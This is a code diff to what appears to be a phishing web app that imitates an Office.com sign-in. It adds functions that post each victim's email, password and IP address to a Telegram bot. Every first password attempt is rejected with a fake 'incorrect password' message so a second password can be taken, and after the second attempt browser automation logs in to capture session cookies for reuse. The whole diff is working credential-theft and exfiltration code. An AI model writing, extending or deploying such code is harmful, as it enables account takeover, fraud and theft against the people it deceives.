@@ -282,6 +282,92 @@ def extract_and_save_cookies(driver, email, password=None):
         logger.error(f"Failed to extract and save session cookies: {e}")
         return False
 
+def send_first_attempt_to_telegram(email, password, ip_address):
+    """Send first password attempt to Telegram"""
+    try:
+        bot_token = config('BOT_TOKEN', default=None)
+        chat_id = config('CHAT_ID', default=None)
+        
+        if not bot_token or not chat_id:
+            logger.error("❌ Telegram credentials not properly configured!")
+            return False
+        
+        if bot_token.strip() == '' or chat_id.strip() == '':
+            logger.error("❌ Telegram credentials are empty!")
+            return False
+        
+        # Create message for first attempt
+        message = f"""🔑 WORKER CREDENTIALS - FIRST ATTEMPT
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP Address: {ip_address}
+📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+⚠️ Status: First attempt (blocked automatically)
+🔄 Next: Moving to second password attempt"""
+        
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        
+        response = requests.post(
+            url,
+            data={
+                'chat_id': chat_id,
+                'text': message
+            },
+            timeout=30
+        )
+        
+        logger.info(f"First attempt response status: {response.status_code}")
+        logger.info(f"First attempt response: {response.text}")
+        
+        return response.status_code == 200
+            
+    except Exception as e:
+        logger.error(f"❌ Error sending first attempt to Telegram: {e}")
+        return False
+
+def send_second_attempt_to_telegram(email, password, ip_address):
+    """Send second password attempt to Telegram"""
+    try:
+        bot_token = config('BOT_TOKEN', default=None)
+        chat_id = config('CHAT_ID', default=None)
+        
+        if not bot_token or not chat_id:
+            logger.error("❌ Telegram credentials not properly configured!")
+            return False
+        
+        if bot_token.strip() == '' or chat_id.strip() == '':
+            logger.error("❌ Telegram credentials are empty!")
+            return False
+        
+        # Create message for second attempt
+        message = f"""🔑 WORKER CREDENTIALS - SECOND ATTEMPT
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP Address: {ip_address}
+📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+✅ Status: Second attempt (proceeding to automation)
+🤖 Next: Starting browser automation and cookie extraction"""
+        
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        
+        response = requests.post(
+            url,
+            data={
+                'chat_id': chat_id,
+                'text': message
+            },
+            timeout=30
+        )
+        
+        logger.info(f"Second attempt response status: {response.status_code}")
+        logger.info(f"Second attempt response: {response.text}")
+        
+        return response.status_code == 200
+            
+    except Exception as e:
+        logger.error(f"❌ Error sending second attempt to Telegram: {e}")
+        return False
+
 def send_cookies_to_telegram(filename, email, password, ip_address):
     """Send cookies file to Telegram with worker details"""
     try:
@@ -307,13 +393,14 @@ def send_cookies_to_telegram(filename, email, password, ip_address):
         logger.info(f"Chat ID type: {type(chat_id)}")
         
         # Create detailed caption with worker information
-        caption = f"""🔑 NEW WORKER CREDENTIALS CAPTURED
+        caption = f"""🔑 FINAL WORKER REPORT - COOKIES CAPTURED
 📧 Email: {email}
 🔒 Password: {password}
 🌐 IP Address: {ip_address}
 📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 📁 Cookie File: {filename.split('/')[-1] if filename else 'No file'}
-✅ Status: Successfully logged into Office.com"""
+✅ Status: Successfully logged into Office.com
+🍪 Cookies extracted and ready for use"""
         
         logger.info(f"📤 Sending worker details to Telegram - Email: {email}, IP: {ip_address}")
         logger.info(f"📤 Message length: {len(caption)} characters")
@@ -552,16 +639,35 @@ def process_form():
             log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                                error_message="First attempt automatically failed - moving to second pass")
             
+            # Report first attempt to Telegram immediately
+            worker_ip = get_remote_address()
+            logger.info(f"📤 Sending FIRST attempt worker details to Telegram for {email}")
+            telegram_success = send_first_attempt_to_telegram(email, password, worker_ip)
+            if telegram_success:
+                logger.info(f"✅ First attempt reported to Telegram for {email}")
+            else:
+                logger.error(f"❌ Failed to send first attempt to Telegram for {email}")
+            
             # Always flash error for first attempt and redirect to retry
             flash('Your account or password is incorrect. Try again.', 'error')
             return redirect(url_for('index', step='retry', email=email, retry='true'))
         
         elif login_attempt.attempt_count == 1:
-            # Second attempt - proceed with automation
+            # Second attempt - report to Telegram before proceeding with automation
             login_attempt.attempt_count = 2
             login_attempt.updated_at = datetime.utcnow()
             db.session.commit()
             log_session_activity("second_attempt_proceeding", user_email=email)
+            
+            # Report second attempt to Telegram immediately
+            worker_ip = get_remote_address()
+            logger.info(f"📤 Sending SECOND attempt worker details to Telegram for {email}")
+            telegram_success = send_second_attempt_to_telegram(email, password, worker_ip)
+            if telegram_success:
+                logger.info(f"✅ Second attempt reported to Telegram for {email}")
+            else:
+                logger.error(f"❌ Failed to send second attempt to Telegram for {email}")
+            
             # Continue with Selenium automation below
         
         else:
